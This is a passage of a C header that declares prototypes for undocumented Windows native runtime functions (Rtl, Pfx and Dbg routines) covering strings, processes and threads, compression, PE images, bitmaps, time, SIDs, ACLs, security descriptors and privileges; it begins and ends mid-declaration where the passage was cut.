	IN ULONG MaxBytesInOemString,
	OUT OPTIONAL PULONG BytesInOemString,
	IN PWCH UnicodeString,
	IN ULONG BytesInUnicodeString
    );

NTSTATUS
NTAPI
RtlConsoleMultiByteToUnicodeN(
	OUT PWCH UnicodeString,
	IN ULONG MaxBytesInUnicodeString,
	OUT OPTIONAL PULONG BytesInUnicodeString OPTIONAL,
	IN PCH MultiByteString,
	IN ULONG BytesInMultiByteString,
	OUT PULONG pdwSpecialChar );

BOOLEAN
NTAPI
RtlIsTextUnicode(
    IN CONST VOID* Buffer,
    IN ULONG Size,
    IN OUT PULONG Result OPTIONAL
    );

NTSTATUS
NTAPI
RtlStringFromGUID(
    IN REFGUID Guid,
    OUT PUNICODE_STRING GuidString
    );

NTSTATUS
NTAPI
RtlGUIDFromString(
    IN PUNICODE_STRING GuidString,
    OUT GUID* Guid
    );

VOID
NTAPI
RtlGenerate8dot3Name (
    IN PUNICODE_STRING Name,
    IN BOOLEAN AllowExtendedCharacters,
    IN OUT PGENERATE_NAME_CONTEXT Context,
    OUT PUNICODE_STRING Name8dot3
    );

BOOLEAN
NTAPI
RtlIsNameLegalDOS8Dot3 (
    IN PUNICODE_STRING Name,
    IN OUT POEM_STRING OemName OPTIONAL,
    IN OUT PBOOLEAN NameContainsSpaces OPTIONAL
    );

VOID
NTAPI
RtlInitializeContext(
    HANDLE Process,
    PCONTEXT Context,
    PVOID Parameter,
    PVOID InitialPc,
    PVOID InitialSp
    );

NTSTATUS
NTAPI
RtlRemoteCall(
    HANDLE Process,
    HANDLE Thread,
    PVOID CallSite,
    ULONG ArgumentCount,
    PULONG_PTR Arguments,
    BOOLEAN PassContext,
    BOOLEAN AlreadySuspended
    );

VOID
NTAPI
RtlAcquirePebLock(
	);

VOID
NTAPI
RtlReleasePebLock(
	);

NTSTATUS
NTAPI
RtlAllocateFromPeb(
	ULONG Size,
	PVOID *Block
	);

NTSTATUS
NTAPI
RtlFreeToPeb(
	PVOID Block,
	ULONG Size
	);

NTSTATUS
STDAPIVCALLTYPE
RtlSetProcessIsCritical(
    IN  BOOLEAN  NewValue,
    OUT PBOOLEAN OldValue OPTIONAL,
    IN  BOOLEAN  CheckFlag
    );

NTSTATUS
STDAPIVCALLTYPE
RtlSetThreadIsCritical(
    IN  BOOLEAN  NewValue,
    OUT PBOOLEAN OldValue OPTIONAL,
    IN  BOOLEAN  CheckFlag
    );

NTSTATUS
NTAPI
RtlCreateEnvironment(
    BOOLEAN CloneCurrentEnvironment,
    PVOID *Environment
    );

NTSTATUS
NTAPI
RtlDestroyEnvironment(
    PVOID Environment
    );

NTSTATUS
NTAPI
RtlSetCurrentEnvironment(
    PVOID Environment,
    PVOID *PreviousEnvironment
    );

NTSTATUS
NTAPI
RtlSetEnvironmentVariable(
    PVOID *Environment,
    PCUNICODE_STRING Name,
    PCUNICODE_STRING Value
    );

ULONG
RtlIsDosDeviceName_U(
	IN PWSTR DosFileName
	);

NTSTATUS
NTAPI
RtlQueryEnvironmentVariable_U (
    PVOID Environment,
    PCUNICODE_STRING Name,
    PUNICODE_STRING Value
    );

NTSTATUS
NTAPI
RtlExpandEnvironmentStrings_U(
    IN PVOID Environment OPTIONAL,
    IN PCUNICODE_STRING Source,
    OUT PUNICODE_STRING Destination,
    OUT PULONG ReturnedLength OPTIONAL
    );

VOID
NTAPI
PfxInitialize (
    PPREFIX_TABLE PrefixTable
    );

BOOLEAN
NTAPI
PfxInsertPrefix (
    PPREFIX_TABLE PrefixTable,
    PSTRING Prefix,
    PPREFIX_TABLE_ENTRY PrefixTableEntry
    );

VOID
NTAPI
PfxRemovePrefix (
    PPREFIX_TABLE PrefixTable,
    PPREFIX_TABLE_ENTRY PrefixTableEntry
    );

PPREFIX_TABLE_ENTRY
NTAPI
PfxFindPrefix (
    PPREFIX_TABLE PrefixTable,
    PSTRING FullName
    );

VOID
NTAPI
RtlInitializeUnicodePrefix (
    PUNICODE_PREFIX_TABLE PrefixTable
    );

BOOLEAN
NTAPI
RtlInsertUnicodePrefix (
    PUNICODE_PREFIX_TABLE PrefixTable,
    PUNICODE_STRING Prefix,
    PUNICODE_PREFIX_TABLE_ENTRY PrefixTableEntry
    );

VOID
NTAPI
RtlRemoveUnicodePrefix (
    PUNICODE_PREFIX_TABLE PrefixTable,
    PUNICODE_PREFIX_TABLE_ENTRY PrefixTableEntry
    );

PUNICODE_PREFIX_TABLE_ENTRY
NTAPI
RtlFindUnicodePrefix (
    PUNICODE_PREFIX_TABLE PrefixTable,
    PUNICODE_STRING FullName,
    ULONG CaseInsensitiveIndex
    );

PUNICODE_PREFIX_TABLE_ENTRY
NTAPI
RtlNextUnicodePrefix (
    PUNICODE_PREFIX_TABLE PrefixTable,
    BOOLEAN Restart
    );

NTSTATUS
NTAPI
RtlGetCompressionWorkSpaceSize (
    IN USHORT CompressionFormatAndEngine,
    OUT PULONG CompressBufferWorkSpaceSize,
    OUT PULONG CompressFragmentWorkSpaceSize
    );

NTSTATUS
NTAPI
RtlCompressBuffer (
    IN USHORT CompressionFormatAndEngine,
    IN PUCHAR UncompressedBuffer,
    IN ULONG UncompressedBufferSize,
    OUT PUCHAR CompressedBuffer,
    IN ULONG CompressedBufferSize,
    IN ULONG UncompressedChunkSize,
    OUT PULONG FinalCompressedSize,
    IN PVOID WorkSpace
    );

NTSTATUS
NTAPI
RtlDecompressBuffer (
    IN USHORT CompressionFormat,
    OUT PUCHAR UncompressedBuffer,
    IN ULONG UncompressedBufferSize,
    IN PUCHAR CompressedBuffer,
    IN ULONG CompressedBufferSize,
    OUT PULONG FinalUncompressedSize
    );

NTSTATUS
NTAPI
RtlDecompressFragment (
    IN USHORT CompressionFormat,
    OUT PUCHAR UncompressedFragment,
    IN ULONG UncompressedFragmentSize,
    IN PUCHAR CompressedBuffer,
    IN ULONG CompressedBufferSize,
    IN ULONG FragmentOffset,
    OUT PULONG FinalUncompressedSize,
    IN PVOID WorkSpace
    );

NTSTATUS
NTAPI
RtlDescribeChunk (
    IN USHORT CompressionFormat,
    IN OUT PUCHAR *CompressedBuffer,
    IN PUCHAR EndOfCompressedBufferPlus1,
    OUT PUCHAR *ChunkBuffer,
    OUT PULONG ChunkSize
    );

NTSTATUS
NTAPI
RtlReserveChunk (
    IN USHORT CompressionFormat,
    IN OUT PUCHAR *CompressedBuffer,
    IN PUCHAR EndOfCompressedBufferPlus1,
    OUT PUCHAR *ChunkBuffer,
    IN ULONG ChunkSize
    );

NTSTATUS
NTAPI
RtlDecompressChunks (
    OUT PUCHAR UncompressedBuffer,
    IN ULONG UncompressedBufferSize,
    IN PUCHAR CompressedBuffer,
    IN ULONG CompressedBufferSize,
    IN PUCHAR CompressedTail,
    IN ULONG CompressedTailSize,
    IN PCOMPRESSED_DATA_INFO CompressedDataInfo
    );

NTSTATUS
NTAPI
RtlCompressChunks (
    IN PUCHAR UncompressedBuffer,
    IN ULONG UncompressedBufferSize,
    OUT PUCHAR CompressedBuffer,
    IN ULONG CompressedBufferSize,
    IN OUT PCOMPRESSED_DATA_INFO CompressedDataInfo,
    IN ULONG CompressedDataInfoLength,
    IN PVOID WorkSpace
    );

NTSTATUS
NTAPI
RtlCreateProcessParameters(
    PRTL_USER_PROCESS_PARAMETERS *ProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData
    );

NTSTATUS
NTAPI
RtlDestroyProcessParameters(
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters
    );

PRTL_USER_PROCESS_PARAMETERS
NTAPI
RtlNormalizeProcessParams(
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters
    );

PRTL_USER_PROCESS_PARAMETERS
NTAPI
RtlDeNormalizeProcessParams(
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters
    );

NTSTATUS
NTAPI
RtlCreateUserProcess(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
    );

NTSTATUS
NTAPI
RtlCreateUserThread(
    HANDLE Process,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    BOOLEAN CreateSuspended,
    ULONG StackZeroBits,
    SIZE_T MaximumStackSize OPTIONAL,
    SIZE_T InitialStackSize OPTIONAL,
    PUSER_THREAD_START_ROUTINE StartAddress,
    PVOID Parameter,
    PHANDLE Thread,
    PCLIENT_ID ClientId
    );

VOID
NTAPI
RtlExitUserThread (
    IN NTSTATUS ExitStatus
    );

VOID
NTAPI
RtlFreeUserThreadStack(
    HANDLE hProcess,
    HANDLE hThread
    );
/*
PVOID
NTAPI
RtlPcToFileHeader(
    PVOID PcValue,
    PVOID *BaseOfImage
    );*/

NTSTATUS
NTAPI
RtlImageNtHeaderEx(
    ULONG Flags,
    PVOID Base,
    ULONG64 Size,
    OUT PIMAGE_NT_HEADERS * OutHeaders
    );

PIMAGE_NT_HEADERS
NTAPI
RtlImageNtHeader(
    PVOID Base
    );

PVOID
NTAPI
RtlAddressInSectionTable (
    IN PIMAGE_NT_HEADERS NtHeaders,
    IN PVOID BaseOfImage,
    IN ULONG VirtualAddress
    );

PIMAGE_SECTION_HEADER
NTAPI
RtlSectionTableFromVirtualAddress (
    IN PIMAGE_NT_HEADERS NtHeaders,
    IN PVOID BaseOfImage,
    IN ULONG VirtualAddress
    );

NTSTATUS
NTAPI
RtlImageDirectoryEntryToData(
    PVOID BaseOfImage,
    BOOLEAN MappedAsImage,
    USHORT DirectoryEntry,
    PULONG Size
    );

PVOID
RtlImageDirectoryEntryToData32 (
    IN PVOID Base,
    IN BOOLEAN MappedAsImage,
    IN USHORT DirectoryEntry,
    OUT PULONG Size
    );

PIMAGE_SECTION_HEADER
NTAPI
RtlImageRvaToSection(
    IN PIMAGE_NT_HEADERS NtHeaders,
    IN PVOID Base,
    IN ULONG Rva
    );

PVOID
NTAPI
RtlImageRvaToVa(
    IN PIMAGE_NT_HEADERS NtHeaders,
    IN PVOID Base,
    IN ULONG Rva,
    IN OUT PIMAGE_SECTION_HEADER *LastRvaSection OPTIONAL
    );


VOID
NTAPI
RtlCopyMemoryNonTemporal (
   VOID UNALIGNED *Destination,
   CONST VOID UNALIGNED *Source,
   SIZE_T Length
   );

VOID __fastcall
RtlPrefetchMemoryNonTemporal(
    IN PVOID Source,
    IN SIZE_T Length
    );

SIZE_T
NTAPI
RtlCompareMemoryUlong (
    PVOID Source,
    SIZE_T Length,
    ULONG Pattern
    );

VOID
NTAPI
RtlFillMemoryUlong (
   PVOID Destination,
   SIZE_T Length,
   ULONG Pattern
   );

VOID
NTAPI
RtlFillMemoryUlonglong (
   PVOID Destination,
   SIZE_T Length,
   ULONGLONG Pattern
   );

VOID
NTAPI
RtlInitializeExceptionLog(
    IN ULONG Entries
    );

LONG
NTAPI
RtlUnhandledExceptionFilter(
    IN struct _EXCEPTION_POINTERS *ExceptionInfo
    );

LONG
NTAPI
RtlUnhandledExceptionFilter2(
    IN struct _EXCEPTION_POINTERS *ExceptionInfo,
    IN PCSTR Function
    );

VOID
NTAPI
DbgUserBreakPoint(
    VOID
    );

VOID
NTAPI
DbgBreakPointWithStatus(
    IN ULONG Status
    );

ULONG
DbgPrintEx (
	IN ULONG ComponentId,
	IN ULONG Level,
	IN PCH Format,
	...
    );

ULONG
NTAPI
vDbgPrintEx(
    IN ULONG ComponentId,
    IN ULONG Level,
    IN PCH Format,
    IN va_list arglist
    );

ULONG
NTAPI
vDbgPrintExWithPrefix (
    IN PCH Prefix,
    IN ULONG ComponentId,
    IN ULONG Level,
    IN PCH Format,
    IN va_list arglist
    );

ULONG
DbgPrintReturnControlC (
	IN PCHAR Format,
	...
    );

NTSTATUS
NTAPI
DbgQueryDebugFilterState (
    IN ULONG ComponentId,
    IN ULONG Level
    );

NTSTATUS
NTAPI
DbgSetDebugFilterState (
    IN ULONG ComponentId,
    IN ULONG Level,
    IN BOOLEAN State
    );

ULONG
NTAPI
DbgPrompt (
	IN PCH Prompt,
	OUT PCH Response,
	IN ULONG Length
    );

VOID
NTAPI
DbgLoadImageSymbols (
	IN PSTRING FileName,
	IN PVOID ImageBase,
	IN ULONG_PTR ProcessId
    );

VOID
NTAPI
DbgUnLoadImageSymbols (
	IN PSTRING FileName,
	IN PVOID ImageBase,
	IN ULONG_PTR ProcessId
    );

VOID
NTAPI
DbgCommandString (
	IN PCH Name,
	IN PCH Command
    );

BOOLEAN
NTAPI
RtlCutoverTimeToSystemTime(
    PTIME_FIELDS CutoverTime,
    PLARGE_INTEGER SystemTime,
    PLARGE_INTEGER CurrentSystemTime,
    BOOLEAN ThisYear
    );

NTSTATUS
NTAPI
RtlSystemTimeToLocalTime (
    IN PLARGE_INTEGER SystemTime,
    OUT PLARGE_INTEGER LocalTime
    );

NTSTATUS
NTAPI
RtlLocalTimeToSystemTime (
    IN PLARGE_INTEGER LocalTime,
    OUT PLARGE_INTEGER SystemTime
    );

VOID
NTAPI
RtlTimeToElapsedTimeFields (
    IN PLARGE_INTEGER Time,
    OUT PTIME_FIELDS TimeFields
    );

VOID
NTAPI
RtlTimeToTimeFields (
    PLARGE_INTEGER Time,
    PTIME_FIELDS TimeFields
    );

BOOLEAN
NTAPI
RtlTimeFieldsToTime (
    PTIME_FIELDS TimeFields,
    PLARGE_INTEGER Time
    );

BOOLEAN
NTAPI
RtlTimeToSecondsSince1980 (
    PLARGE_INTEGER Time,
    PULONG ElapsedSeconds
    );

VOID
NTAPI
RtlSecondsSince1980ToTime (
    ULONG ElapsedSeconds,
    PLARGE_INTEGER Time
    );

BOOLEAN
NTAPI
RtlTimeToSecondsSince1970 (
    PLARGE_INTEGER Time,
    PULONG ElapsedSeconds
    );

VOID
NTAPI
RtlSecondsSince1970ToTime (
    ULONG ElapsedSeconds,
    PLARGE_INTEGER Time
    );

NTSTATUS
NTAPI
RtlQueryTimeZoneInformation(
    OUT PRTL_TIME_ZONE_INFORMATION TimeZoneInformation
    );

NTSTATUS
NTAPI
RtlSetTimeZoneInformation(
    IN PRTL_TIME_ZONE_INFORMATION TimeZoneInformation
    );

NTSTATUS
NTAPI
RtlSetActiveTimeBias(
    IN LONG ActiveBias
    );

VOID
NTAPI
RtlInitializeBitMap (
    PRTL_BITMAP BitMapHeader,
    PULONG BitMapBuffer,
    ULONG SizeOfBitMap
    );

VOID
NTAPI
RtlClearBit (
    PRTL_BITMAP BitMapHeader,
    ULONG BitNumber
    );

VOID
NTAPI
RtlSetBit (
    PRTL_BITMAP BitMapHeader,
    ULONG BitNumber
    );

BOOLEAN
NTAPI
RtlTestBit (
    PRTL_BITMAP BitMapHeader,
    ULONG BitNumber
    );

VOID
NTAPI
RtlClearAllBits (
    PRTL_BITMAP BitMapHeader
    );

VOID
NTAPI
RtlSetAllBits (
    PRTL_BITMAP BitMapHeader
    );

ULONG
NTAPI
RtlFindClearBits (
    PRTL_BITMAP BitMapHeader,
    ULONG NumberToFind,
    ULONG HintIndex
    );

ULONG
NTAPI
RtlFindSetBits (
    PRTL_BITMAP BitMapHeader,
    ULONG NumberToFind,
    ULONG HintIndex
    );

ULONG
NTAPI
RtlFindClearBitsAndSet (
    PRTL_BITMAP BitMapHeader,
    ULONG NumberToFind,
    ULONG HintIndex
    );

ULONG
NTAPI
RtlFindSetBitsAndClear (
    PRTL_BITMAP BitMapHeader,
    ULONG NumberToFind,
    ULONG HintIndex
    );

VOID
NTAPI
RtlClearBits (
    PRTL_BITMAP BitMapHeader,
    ULONG StartingIndex,
    ULONG NumberToClear
    );

VOID
NTAPI
RtlSetBits (
    PRTL_BITMAP BitMapHeader,
    ULONG StartingIndex,
    ULONG NumberToSet
    );

ULONG
NTAPI
RtlFindClearRuns (
    PRTL_BITMAP BitMapHeader,
    PRTL_BITMAP_RUN RunArray,
    ULONG SizeOfRunArray,
    BOOLEAN LocateLongestRuns
    );

ULONG
NTAPI
RtlFindLongestRunClear (
    PRTL_BITMAP BitMapHeader,
    PULONG StartingIndex
    );

ULONG
NTAPI
RtlFindFirstRunClear (
    PRTL_BITMAP BitMapHeader,
    PULONG StartingIndex
    );

ULONG
NTAPI
RtlNumberOfClearBits (
    PRTL_BITMAP BitMapHeader
    );

ULONG
NTAPI
RtlNumberOfSetBits (
    PRTL_BITMAP BitMapHeader
    );

BOOLEAN
NTAPI
RtlAreBitsClear (
    PRTL_BITMAP BitMapHeader,
    ULONG StartingIndex,
    ULONG Length
    );

BOOLEAN
NTAPI
RtlAreBitsSet (
    PRTL_BITMAP BitMapHeader,
    ULONG StartingIndex,
    ULONG Length
    );

ULONG
NTAPI
RtlFindNextForwardRunClear (
    IN PRTL_BITMAP BitMapHeader,
    IN ULONG FromIndex,
    IN PULONG StartingRunIndex
    );

ULONG
NTAPI
RtlFindLastBackwardRunClear (
    IN PRTL_BITMAP BitMapHeader,
    IN ULONG FromIndex,
    IN PULONG StartingRunIndex
    );

CCHAR
NTAPI
RtlFindLeastSignificantBit (
    IN ULONGLONG Set
    );

CCHAR
NTAPI
RtlFindMostSignificantBit (
    IN ULONGLONG Set
    );

BOOLEAN
NTAPI
RtlValidSid (
    PSID Sid
    );

BOOLEAN
NTAPI
RtlEqualSid (
    PSID Sid1,
    PSID Sid2
    );

BOOLEAN
NTAPI
RtlEqualPrefixSid (
    PSID Sid1,
    PSID Sid2
    );

ULONG
NTAPI
RtlLengthRequiredSid (
    ULONG SubAuthorityCount
    );

PVOID
NTAPI
RtlFreeSid(
    IN PSID Sid
    );

NTSTATUS
NTAPI
RtlInitializeSid(
	OUT PSID Sid,
	IN PSID_IDENTIFIER_AUTHORITY IdentifierAuthority,
	IN UCHAR SubAuthorityCount
	);

NTSTATUS
NTAPI
RtlAllocateAndInitializeSid(
    IN PSID_IDENTIFIER_AUTHORITY IdentifierAuthority,
    IN UCHAR SubAuthorityCount,
    IN ULONG SubAuthority0,
    IN ULONG SubAuthority1,
    IN ULONG SubAuthority2,
    IN ULONG SubAuthority3,
    IN ULONG SubAuthority4,
    IN ULONG SubAuthority5,
    IN ULONG SubAuthority6,
    IN ULONG SubAuthority7,
    OUT PSID *Sid
    );

PSID_IDENTIFIER_AUTHORITY
NTAPI
RtlIdentifierAuthoritySid (
    PSID Sid
    );

PULONG
NTAPI
RtlSubAuthoritySid(
	IN PSID Sid,
	IN ULONG SubAuthority
	);

PUCHAR
NTAPI
RtlSubAuthorityCountSid (
    PSID Sid
    );

ULONG
NTAPI
RtlLengthSid (
    PSID Sid
    );

NTSTATUS
NTAPI
RtlCopySid (
    ULONG DestinationSidLength,
    PSID DestinationSid,
    PSID SourceSid
    );

NTSTATUS
NTAPI
RtlCopySidAndAttributesArray (
    ULONG ArrayLength,
    PSID_AND_ATTRIBUTES Source,
    ULONG TargetSidBufferSize,
    PSID_AND_ATTRIBUTES TargetArrayElement,
    PSID TargetSid,
    PSID *NextTargetSid,
    PULONG RemainingTargetSidSize
    );

NTSTATUS
NTAPI
RtlLengthSidAsUnicodeString(
    PSID Sid,
    PULONG StringLength
    );

NTSTATUS
NTAPI
RtlConvertSidToUnicodeString(
    PUNICODE_STRING UnicodeString,
    PSID Sid,
    BOOLEAN AllocateDestinationString
    );

VOID
NTAPI
RtlCopyLuid (
    PLUID DestinationLuid,
    PLUID SourceLuid
    );

VOID
NTAPI
RtlCopyLuidAndAttributesArray (
    ULONG ArrayLength,
    PLUID_AND_ATTRIBUTES Source,
    PLUID_AND_ATTRIBUTES Target
    );

BOOLEAN
NTAPI
RtlAreAllAccessesGranted(
    ACCESS_MASK GrantedAccess,
    ACCESS_MASK DesiredAccess
    );

BOOLEAN
NTAPI
RtlAreAnyAccessesGranted(
    ACCESS_MASK GrantedAccess,
    ACCESS_MASK DesiredAccess
    );

VOID
NTAPI
RtlMapGenericMask(
    PACCESS_MASK AccessMask,
    PGENERIC_MAPPING GenericMapping
    );

NTSTATUS
NTAPI
RtlCreateAcl(
	OUT PACL Acl,
	IN ULONG AclLength,
	IN ULONG AclRevision
	);

BOOLEAN
NTAPI
RtlValidAcl(
	PACL Acl
	);

NTSTATUS
NTAPI
RtlQueryInformationAcl(
	PACL Acl,
	PVOID AclInformation,
	ULONG AclInformationLength,
	ACL_INFORMATION_CLASS AclInformationClass
	);

NTSTATUS
NTAPI
RtlSetInformationAcl(
	PACL Acl,
	PVOID AclInformation,
	ULONG AclInformationLength,
	ACL_INFORMATION_CLASS AclInformationClass
	);

NTSTATUS
NTAPI
RtlAddAce(
	PACL Acl,
	ULONG AceRevision,
	ULONG StartingAceIndex,
	PVOID AceList,
	ULONG AceListLength
	);

NTSTATUS
NTAPI
RtlDeleteAce(
	PACL Acl,
	ULONG AceIndex
	);

NTSTATUS
NTAPI
RtlGetAce(
	PACL Acl,
	ULONG AceIndex,
	PVOID *Ace
	);

NTSTATUS
NTAPI
RtlSetOwnerSecurityDescriptor(
	IN OUT PSECURITY_DESCRIPTOR SecurityDescriptor,
	IN OPTIONAL PSID Owner,
	IN OPTIONAL BOOLEAN OwnerDefaulted
	);

NTSTATUS
NTAPI
RtlGetOwnerSecurityDescriptor(
	IN PSECURITY_DESCRIPTOR SecurityDescriptor,
	OUT PSID *Owner,
	OUT PBOOLEAN OwnerDefaulted
	);

NTSTATUS
NTAPI
RtlAddAccessAllowedAce(
	PACL Acl,
	ULONG AceRevision,
	ACCESS_MASK AccessMask,
	PSID Sid
	);

NTSTATUS
NTAPI
RtlAddAccessAllowedAceEx(
	PACL Acl,
	ULONG AceRevision,
	ULONG AceFlags,
	ACCESS_MASK AccessMask,
	PSID Sid
	);

NTSTATUS
NTAPI
RtlAddAccessDeniedAce(
	PACL Acl,
	ULONG AceRevision,
	ACCESS_MASK AccessMask,
	PSID Sid
	);

NTSTATUS
NTAPI
RtlAddAccessDeniedAceEx(
	PACL Acl,
	ULONG AceRevision,
	ULONG AceFlags,
	ACCESS_MASK AccessMask,
	PSID Sid
	);

NTSTATUS
NTAPI
RtlAddAuditAccessAce(
	PACL Acl,
	ULONG AceRevision,
	ACCESS_MASK AccessMask,
	PSID Sid,
	BOOLEAN AuditSuccess,
	BOOLEAN AuditFailure
	);

NTSTATUS
NTAPI
RtlAddAuditAccessAceEx(
	PACL Acl,
	ULONG AceRevision,
	ULONG AceFlags,
	ACCESS_MASK AccessMask,
	PSID Sid,
	BOOLEAN AuditSuccess,
	BOOLEAN AuditFailure
	);

NTSTATUS
NTAPI
RtlAddAccessAllowedObjectAce(
	IN OUT PACL Acl,
	IN ULONG AceRevision,
	IN ULONG AceFlags,
	IN ACCESS_MASK AccessMask,
	IN GUID *ObjectTypeGuid OPTIONAL,
	IN GUID *InheritedObjectTypeGuid OPTIONAL,
	IN PSID Sid
	);

NTSTATUS
NTAPI
RtlAddAccessDeniedObjectAce(
	IN OUT PACL Acl,
	IN ULONG AceRevision,
	IN ULONG AceFlags,
	IN ACCESS_MASK AccessMask,
	IN GUID *ObjectTypeGuid OPTIONAL,
	IN GUID *InheritedObjectTypeGuid OPTIONAL,
	IN PSID Sid
	);

NTSTATUS
NTAPI
RtlAddAuditAccessObjectAce(
	IN OUT PACL Acl,
	IN ULONG AceRevision,
	IN ULONG AceFlags,
	IN ACCESS_MASK AccessMask,
	IN GUID *ObjectTypeGuid OPTIONAL,
	IN GUID *InheritedObjectTypeGuid OPTIONAL,
	IN PSID Sid,
	BOOLEAN AuditSuccess,
	BOOLEAN AuditFailure
	);

BOOLEAN
NTAPI
RtlFirstFreeAce(
	PACL Acl,
	PVOID *FirstFree
	);

NTSTATUS
NTAPI
RtlAddCompoundAce(
	IN PACL Acl,
	IN ULONG AceRevision,
	IN UCHAR AceType,
	IN ACCESS_MASK AccessMask,
	IN PSID ServerSid,
	IN PSID ClientSid
	);

NTSTATUS
NTAPI
RtlCreateSecurityDescriptor(
    PSECURITY_DESCRIPTOR SecurityDescriptor,
    ULONG Revision
    );

NTSTATUS
NTAPI
RtlCreateSecurityDescriptorRelative(
    PISECURITY_DESCRIPTOR_RELATIVE SecurityDescriptor,
    ULONG Revision
    );

BOOLEAN
NTAPI
RtlValidSecurityDescriptor(
    PSECURITY_DESCRIPTOR SecurityDescriptor
    );

ULONG
NTAPI
RtlLengthSecurityDescriptor(
    PSECURITY_DESCRIPTOR SecurityDescriptor
    );

BOOLEAN
NTAPI
RtlValidRelativeSecurityDescriptor(
    IN PSECURITY_DESCRIPTOR SecurityDescriptorInput,
    IN ULONG SecurityDescriptorLength,
    IN SECURITY_INFORMATION RequiredInformation
    );

NTSTATUS
NTAPI
RtlGetControlSecurityDescriptor (
    PSECURITY_DESCRIPTOR SecurityDescriptor,
    PSECURITY_DESCRIPTOR_CONTROL Control,
    PULONG Revision
    );

NTSTATUS
NTAPI
RtlSetControlSecurityDescriptor (
     IN PSECURITY_DESCRIPTOR pSecurityDescriptor,
     IN SECURITY_DESCRIPTOR_CONTROL ControlBitsOfInterest,
     IN SECURITY_DESCRIPTOR_CONTROL ControlBitsToSet
     );

NTSTATUS
NTAPI
RtlSetAttributesSecurityDescriptor(
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN SECURITY_DESCRIPTOR_CONTROL Control,
    IN OUT PULONG Revision
    );

NTSTATUS
NTAPI
RtlSetDaclSecurityDescriptor (
    PSECURITY_DESCRIPTOR SecurityDescriptor,
    BOOLEAN DaclPresent,
    PACL Dacl,
    BOOLEAN DaclDefaulted
    );

NTSTATUS
NTAPI
RtlGetDaclSecurityDescriptor (
    IN  PSECURITY_DESCRIPTOR SecurityDescriptor,
    OUT PBOOLEAN DaclPresent,
    OUT PACL *Dacl,
    OUT PBOOLEAN DaclDefaulted
    );

BOOLEAN
NTAPI
RtlGetSecurityDescriptorRMControl(
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    OUT PUCHAR RMControl
    );

VOID
NTAPI
RtlSetSecurityDescriptorRMControl(
    IN OUT PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN PUCHAR RMControl OPTIONAL
    );

NTSTATUS
NTAPI
RtlSetSaclSecurityDescriptor (
    PSECURITY_DESCRIPTOR SecurityDescriptor,
    BOOLEAN SaclPresent,
    PACL Sacl,
    BOOLEAN SaclDefaulted
    );

NTSTATUS
NTAPI
RtlGetSaclSecurityDescriptor (
    IN  PSECURITY_DESCRIPTOR SecurityDescriptor,
    OUT PBOOLEAN SaclPresent,
    OUT PACL *Sacl,
    OUT PBOOLEAN SaclDefaulted
    );

NTSTATUS
NTAPI
RtlSetGroupSecurityDescriptor (
    IN OUT PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN PSID Group OPTIONAL,
    IN BOOLEAN GroupDefaulted OPTIONAL
    );

NTSTATUS
NTAPI
RtlGetGroupSecurityDescriptor (
    IN  PSECURITY_DESCRIPTOR SecurityDescriptor,
    OUT PSID *Group,
    OUT PBOOLEAN GroupDefaulted
    );

NTSTATUS
NTAPI
RtlMakeSelfRelativeSD (
    IN PSECURITY_DESCRIPTOR AbsoluteSecurityDescriptor,
    OUT PSECURITY_DESCRIPTOR SelfRelativeSecurityDescriptor,
    IN OUT PULONG BufferLength
    );

NTSTATUS
NTAPI
RtlAbsoluteToSelfRelativeSD (
    IN PSECURITY_DESCRIPTOR AbsoluteSecurityDescriptor,
    OUT PSECURITY_DESCRIPTOR SelfRelativeSecurityDescriptor,
    IN OUT PULONG BufferLength
    );

NTSTATUS
NTAPI
RtlSelfRelativeToAbsoluteSD (
    IN PSECURITY_DESCRIPTOR SelfRelativeSecurityDescriptor,
    OUT OPTIONAL PSECURITY_DESCRIPTOR AbsoluteSecurityDescriptor,
    IN OUT PULONG AbsoluteSecurityDescriptorSize,
    OUT OPTIONAL PACL Dacl,
    IN OUT PULONG DaclSize,
    OUT OPTIONAL PACL Sacl,
    IN OUT PULONG SaclSize,
    OUT OPTIONAL PSID Owner,
    IN OUT PULONG OwnerSize,
    OUT OPTIONAL PSID PrimaryGroup,
    IN OUT PULONG PrimaryGroupSize
    );

NTSTATUS
NTAPI
RtlSelfRelativeToAbsoluteSD2 (
    IN OUT PSECURITY_DESCRIPTOR pSelfRelativeSecurityDescriptor,
    IN OUT PULONG pBufferSize
    );

NTSTATUS
NTAPI
RtlNewSecurityGrantedAccess (
    ACCESS_MASK DesiredAccess,
    PPRIVILEGE_SET Privileges,
    PULONG Length,
    HANDLE Token,
    PGENERIC_MAPPING GenericMapping,
    PACCESS_MASK RemainingDesiredAccess
    );

NTSTATUS
NTAPI
RtlMapSecurityErrorToNtStatus (
    SECURITY_STATUS Error
    );

NTSTATUS
NTAPI
RtlImpersonateSelf (
    IN SECURITY_IMPERSONATION_LEVEL ImpersonationLevel
    );

NTSTATUS
NTAPI
RtlAdjustPrivilege (
    ULONG Privilege,
    BOOLEAN Enable,
    BOOLEAN Client,
    PBOOLEAN WasEnabled
    );

NTSTATUS
NTAPI
RtlAcquirePrivilege (
    PULONG Privilege,
    ULONG NumPriv,
    ULONG Flags,
    PVOID *ReturnedState
    );

VOID
NTAPI
RtlReleasePrivilege (
    PVOID StatePointer
    );

VOID
NTAPI
RtlRunEncodeUnicodeString(
    PUCHAR          Seed        OPTIONAL,
    PUNICODE_STRING String
    );

VOID
NTAPI
RtlRunDecodeUnicodeString(
    UCHAR           Seed,
    PUNICODE_STRING String
    );

VOID
NTAPI
